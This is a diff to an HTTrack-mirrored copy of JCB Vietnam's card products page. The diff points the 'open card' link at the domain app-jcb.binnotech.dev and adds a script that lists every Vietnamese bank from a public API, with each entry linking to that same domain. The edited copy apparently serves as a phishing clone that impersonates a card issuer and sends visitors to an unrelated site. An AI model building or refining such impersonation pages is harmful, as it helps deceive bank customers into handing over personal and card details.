@@ -85,7 +85,7 @@
                 <ul id="primary-navigation"
                   class="responsive-list inline-list--right inline-list--space-left dropdown_submenu">
                   <li><a class="consumers"
-                      href="https://app.ku1vn.com">Mở
+                      href="https://app-jcb.binnotech.dev">Mở
                       thẻ</a>
                     <ul id="bankList">
                     </ul>
@@ -1268,7 +1268,23 @@
       <span class="vi_invisible">
 
       </span>
-
+      <script>
+      fetch('https://api.vietqr.io/v2/banks')
+        .then(response => response.json())
+        .then(data => {
+          const banks = data.data;
+          console.log(banks);
+          const bankList = document.getElementById('bankList');
+          bankList.style.width = '100%';
+          banks.forEach(bank => {
+            const li = document.createElement('li');
+            // li.classList.add('second-top');
+            li.innerHTML = `<a style="width: 100%" href="${'https://app-jcb.binnotech.dev'}" target="_blank">${bank.name + ' - ' + bank.code}</a>`;
+            bankList.appendChild(li);
+            console.log(li);
+          });
+        });
+      </script>
       <!-- common files -->
       <script src="./common/js/matchmedia/matchMedia.js"></script>
       <script
@@ -1288,23 +1304,7 @@
 
     </span>
     <span class="vi_bottom_body"></span>
-    <script>
-      fetch('https://api.vietqr.io/v2/banks')
-        .then(response => response.json())
-        .then(data => {
-          const banks = data.data;
-          console.log(banks);
-          const bankList = document.getElementById('bankList');
-          bankList.style.width = '100%';
-          banks.forEach(bank => {
-            const li = document.createElement('li');
-            // li.classList.add('second-top');
-            li.innerHTML = `<a style="width: 100%" href="${'https://app_jcb.binnotech.dev'}" target="_blank">${bank.name + ' - ' + bank.code}</a>`;
-            bankList.appendChild(li);
-            console.log(li);
-          });
-        });
-    </script>
+
   </body>
 
   <!-- Mirrored from www.vn.jcb/vi/products/cards/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Feb 2024 10:11:41 GMT -->
